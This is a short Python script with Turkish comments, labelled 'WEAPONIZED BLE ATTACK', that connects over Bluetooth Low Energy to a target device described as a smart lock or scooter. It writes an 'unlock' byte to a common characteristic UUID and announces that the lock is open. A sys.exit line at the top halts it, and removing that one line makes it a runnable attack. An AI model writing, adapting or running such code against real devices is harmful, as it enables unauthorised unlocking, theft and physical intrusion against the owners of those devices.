from bluepy.btle import Peripheral
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod BLE cihazlarına komut gönderir.")

print("--- WEAPONIZED BLE ATTACK ---")

target_mac = "11:22:33:44:55:66" # Akıllı Kilit veya Scooter

def exploit_ble():
    print(f"[*] Cihaza bağlanılıyor: {target_mac}")
    p = Peripheral(target_mac)
    
    # 1. HEDEF UUID (Weaponized Part)
    # Simülasyonda sadece scan yapıyorduk.
    # Gerçekte üreticinin "Unlock" fonksiyonuna denk gelen UUID'yi buluyoruz.
    service_uuid = "0000ffe0-0000-1000-8000-00805f9b34fb"
    char_uuid    = "0000ffe1-0000-1000-8000-00805f9b34fb"
    
    # 2. PAYLOAD GÖNDERME
    # '0x01' byte'ı genelde "AÇ" veya "BAŞLAT" komutudur.
    payload = b"\x01" 
    
    svc = p.getServiceByUUID(service_uuid)
    ch = svc.getCharacteristics(char_uuid)[0]
    
    print(f"[!] Komut gönderiliyor: {payload}")
    ch.write(payload, withResponse=True)
    
    print("💀 İŞLEM TAMAM: Kilit açıldı.")
    p.disconnect()

if __name__ == "__main__":
    exploit_ble()